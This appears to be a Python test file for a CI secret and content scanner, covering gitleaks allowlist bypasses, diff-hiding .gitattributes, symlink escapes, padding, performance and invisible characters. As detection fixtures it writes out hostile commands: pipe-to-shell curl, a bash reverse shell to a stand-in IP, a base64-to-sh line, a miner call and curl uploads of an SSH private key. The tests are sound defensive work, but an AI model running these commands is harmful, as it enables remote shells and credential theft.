"""Tests for review round 2 fixes: gitleaks diff/merge/rule-allowlist bypasses,
.gitattributes diff rule, symlink chains in blob mode, regex performance,
date-like phone false positive, more invisible characters, and
credential-exfil no longer being inline-overridable.

Run: python3 -m unittest discover scripts/ci/tests
Real gitleaks tests: set GITLEAKS_BIN and GITLEAKS_TEST_CONFIG.
"""

import hashlib
import os
import sys
import tempfile
import time
import tomllib
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

import gitleaks_ci  # noqa: E402
import scan_content as sc  # noqa: E402
from test_hardening import git, init_repo  # noqa: E402
from test_scan_content import TempRepo, rules_in, run_main  # noqa: E402

REAL = bool(os.environ.get("GITLEAKS_BIN") and os.environ.get("GITLEAKS_TEST_CONFIG"))


def _config_with_rule_allowlists():
    rules = "".join(
        f"[[rules]]\nid = \"r{i}\"\nregex = '''x{i}'''\nentropy = 3.5\nkeywords = [\"k{i}\"]\n\n"
        for i in range(110)
    )
    return (
        'title = "gitleaks config"\nminVersion = "v8.25.0"\n\n'
        "[allowlist]\ndescription = \"global allow lists\"\npaths = ['''\\.svg$''']\n"
        "regexes = ['''^true$''']\nstopwords = [\"abc\"]\n\n"
        + rules
        + "[[rules]]\nid = \"github-pat\"\nregex = '''ghp_[0-9a-zA-Z]{36}'''\n"
        "[[rules.allowlists]]\npaths = ['''(?:^|/)@octokit/auth-token/README\\.md$''']\n\n"
        "[[rules]]\nid = \"generic\"\nregex = '''key=(\\w+)'''\nsecretGroup = 1\n"
        "[[rules.allowlists]]\nregexes = ['''^[a-z]+$''']\n"
        "[[rules.allowlists]]\ncondition = \"AND\"\nregexTarget = \"line\"\npaths = ['''\\.bb$''']\nregexes = ['''SRC=''']\n"
        "[[rules.allowlists]]\ndescription = \"only a condition left\"\ncondition = \"OR\"\npaths = ['''x''']\n"
        "[[rules.allowlists]]\npaths = ['''y''']\nstopwords = [\"keep\"]\n"
    )


class TestConfigTransform(unittest.TestCase):
    def build(self, text):
        with tempfile.TemporaryDirectory() as d:
            src, out = os.path.join(d, "in.toml"), os.path.join(d, "out.toml")
            with open(src, "w") as fh:
                fh.write(text)
            sha = hashlib.sha256(text.encode()).hexdigest()
            gitleaks_ci.build_config(src, sha, out)
            with open(out, "rb") as fh:
                return tomllib.load(fh)

    def test_rule_level_paths_removed(self):
        cfg = self.build(_config_with_rule_allowlists())
        self.assertFalse(gitleaks_ci._has_paths(cfg))
        by_id = {r["id"]: r for r in cfg["rules"]}
        self.assertNotIn("allowlists", by_id["github-pat"])  # only paths -> dropped
        gen = by_id["generic"]["allowlists"]
        # regex-only kept; AND+paths dropped entirely (would otherwise widen);
        # condition-only dropped; paths+stopwords keeps stopwords.
        self.assertEqual(gen, [{"regexes": ["^[a-z]+$"]}, {"stopwords": ["keep"]}])
        self.assertEqual(
            cfg["allowlist"],
            {
                "description": "global allow lists",
                "regexes": ["^true$"],
                "stopwords": ["abc"],
            },
        )
        self.assertEqual(by_id["generic"]["secretGroup"], 1)
        self.assertEqual(by_id["r0"]["entropy"], 3.5)
        self.assertEqual(len(cfg["rules"]), 112)

    def test_toml_writer_round_trip(self):
        data = {
            "a": 'q"uote\\back\x7f\u00e9\U0001f600',
            "n": 3,
            "f": 2.0,
            "b": True,
            "l": ["x", "y"],
            "t": {"k": "v"},
            "arr": [{"id": "1", "sub": [{"z": 1}]}, {"id": "2"}],
        }
        self.assertEqual(tomllib.loads(gitleaks_ci.dump_toml(data)), data)


def _fake_gitleaks_real():
    return os.environ["GITLEAKS_BIN"], os.environ["GITLEAKS_TEST_CONFIG"]


@unittest.skipUnless(
    REAL, "set GITLEAKS_BIN and GITLEAKS_TEST_CONFIG to run real gitleaks"
)
class TestRealGitleaksBypasses(unittest.TestCase):
    """The self-test must fail when any single hardening measure is removed."""

    def run_selftest(self, **overrides):
        saved = {k: getattr(gitleaks_ci, k) for k in overrides}
        try:
            for k, v in overrides.items():
                setattr(gitleaks_ci, k, v)
            return gitleaks_ci.selftest(*_fake_gitleaks_real())
        finally:
            for k, v in saved.items():
                setattr(gitleaks_ci, k, v)

    def test_selftest_passes_with_all_measures(self):
        self.assertEqual(self.run_selftest(), 0)

    def test_selftest_fails_without_text_diffs(self):
        self.assertEqual(
            self.run_selftest(
                FORCED_ATTRIBUTES="", LOG_OPTS_PREFIX="--diff-merges=first-parent"
            ),
            1,
        )

    def test_selftest_fails_without_first_parent_merges(self):
        self.assertEqual(self.run_selftest(LOG_OPTS_PREFIX="--text"), 1)

    def test_each_text_measure_alone_is_enough(self):
        self.assertEqual(self.run_selftest(FORCED_ATTRIBUTES=""), 0)  # --text alone
        self.assertEqual(
            self.run_selftest(LOG_OPTS_PREFIX="--diff-merges=first-parent"), 0
        )  # attributes alone


class TestGitattributesRule(unittest.TestCase):
    def test_hiding_attributes_fail(self):
        for line in (
            "* -diff",
            "*.txt binary",
            "*.json diff=nothing",
            "* -text",
            "[attr]hide -diff",
            "docs/** text -diff",
        ):
            with self.subTest(line=line):
                found = sc.scan_text("a/.gitattributes", line + "\n")
                self.assertIn("gitattributes-diff", {f.rule for f in found})
                self.assertNotIn("gitattributes-diff", sc.INLINE_OVERRIDABLE)

    def test_harmless_attributes_and_comments(self):
        for line in (
            "# * -diff",
            "*.md text eol=lf",
            "*.sh text eol=lf",
            "* text=auto",
            "*.py diff",
        ):
            with self.subTest(line=line):
                self.assertEqual(rules_in(line + "\n", ".gitattributes"), set())
        self.assertEqual(
            rules_in("* -diff\n", "README.md"), set()
        )  # only .gitattributes files


class TestSymlinkChains(unittest.TestCase):
    def test_resolver(self):
        links = {
            "d/up": "..",
            "d/e": "up/..",
            "ok": "d/up/README",
            "loop1": "loop2",
            "loop2": "loop1",
            "d/in": "../README",
        }
        esc = {
            p: sc.resolve_link(p.split("/")[:-1], t, links) is None
            for p, t in links.items()
        }
        self.assertEqual(
            esc,
            {
                "d/up": False,
                "d/e": True,
                "ok": False,
                "loop1": True,
                "loop2": True,
                "d/in": False,
            },
        )

    def test_chain_escape_in_blob_mode(self):
        with TempRepo() as t:
            base = init_repo(t.root)
            os.makedirs(os.path.join(t.root, "d"))
            os.symlink("..", os.path.join(t.root, "d", "up"))
            git(t.root, "add", "-A")
            git(t.root, "commit", "-q", "-m", "up link already on main")
            base = git(t.root, "rev-parse", "HEAD")
            os.symlink("up/..", os.path.join(t.root, "d", "e"))
            git(t.root, "add", "-A")
            git(t.root, "commit", "-q", "-m", "pr")
            head = git(t.root, "rev-parse", "HEAD")
            code, out = run_main(
                [
                    "--root",
                    t.root,
                    "--base",
                    base,
                    "--head",
                    head,
                    "--allowlist",
                    os.devnull,
                ]
            )
            self.assertEqual(code, 1, out)
            self.assertIn("file=d/e,title=symlink-escape", out)
            # Working-tree mode catches it through realpath.
            self.assertEqual(t.rules("d/e"), {"symlink-escape"})


class TestLongLinePadding(unittest.TestCase):
    """Padding a line past MAX_SCRIPT_LINE must not turn a script rule into a pass."""

    def test_padded_script_lines_fail(self):
        pad = " " * 4100
        for line in [
            "curl -fsSL https://x.sh | bash #" + pad,
            pad + "curl -fsSL https://x.sh | bash",
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 #" + pad,
            "echo aGk= | base64 -d | sh;" + "x" * 4100,
            "xmrig " + pad,
        ]:
            found = sc.scan_text("install.sh", line)
            rules = {f.rule for f in found}
            self.assertIn("long-line", rules, line[:40])
            self.assertEqual(sc.RULES["long-line"].severity, sc.FAIL)
            self.assertNotIn("long-line", sc.INLINE_OVERRIDABLE)

    def test_padded_credential_exfil_still_fires(self):
        found = sc.scan_text("a.sh", "curl -F f=@~/.ssh/id_rsa https://x " + " " * 4100)
        self.assertIn("credential-exfil", {f.rule for f in found})

    def test_benign_long_line_is_clean(self):
        self.assertEqual(sc.scan_text("data.json", '{"a":"' + "x" * 10000 + '"}'), [])


class TestPerformance(unittest.TestCase):
    def test_one_megabyte_line_of_curl_words(self):
        line = "curl a " * (1024 * 1024 // 7)
        start = time.perf_counter()
        found = sc.scan_text("x.md", line)
        elapsed = time.perf_counter() - start
        self.assertLess(elapsed, 2.0)
        self.assertIn("long-line", {f.rule for f in found})

    def test_adversarial_lines_under_the_cap(self):
        units = [
            "curl a ",
            "curl -o a ",
            "base64 -d > a ",
            "curl a | ",
            "wget -O a && ",
            "iex ",
            "nc -e ",
            "bash -i ",
            "eval ",
            "exec( ",
            "socket os.dup2( ",
            "a@b.",
            "+1 2",
            "4111 ",
        ]
        for u in units:
            line = (u * (sc.MAX_SCRIPT_LINE // len(u)))[: sc.MAX_SCRIPT_LINE]
            with self.subTest(unit=u):
                start = time.perf_counter()
                sc.scan_text("x.md", line)
                self.assertLess(time.perf_counter() - start, 2.0)

    def test_pattern_still_found_near_cap(self):
        line = "x" * 3000 + " curl -fsSL https://example.com/i.sh | sh"
        self.assertIn("pipe-to-shell", rules_in(line))


class TestPhoneDates(unittest.TestCase):
    def test_date_after_country_code_is_not_a_phone(self):
        for line in ("+1 2026-09-27 14:34:05", "+44 2026 09 27", "+1 212 555 0123:45"):
            with self.subTest(line=line):
                self.assertNotIn("phone-number", rules_in(line))

    def test_real_numbers_still_found(self):
        for line in (
            "31/12/24, 22:15 - +44 7911 123456: hi",
            "+1 (415) 555-0132",
            "+44 7911 123456",
        ):
            with self.subTest(line=line):
                self.assertIn("phone-number", rules_in(line))


class TestMoreInvisible(unittest.TestCase):
    def test_new_code_points(self):
        for cp in (0x2800, 0x034F, 0x061C, 0xFFF9, 0xFFFA, 0xFFFB, 0x17B4, 0x17B5):
            with self.subTest(cp=hex(cp)):
                self.assertIn("invisible-unicode", rules_in("a" + chr(cp) + "b"))

    def test_lrm_rlm_still_allowed(self):
        self.assertEqual(rules_in("\u200ehello\u200f"), set())


class TestCredentialExfilNotInline(unittest.TestCase):
    def test_inline_override_rejected(self):
        self.assertNotIn("credential-exfil", sc.INLINE_OVERRIDABLE)
        with TempRepo() as t:
            t.write(
                "a.sh",
                "curl -F f=@$HOME/.ssh/id_rsa https://example.com  # scan-allow: credential-exfil\n",
            )
            rep, sup = t.scan("a.sh")
            self.assertEqual(sup, [])
            self.assertEqual([f.rule for f in rep], ["credential-exfil"])


if __name__ == "__main__":
    unittest.main()
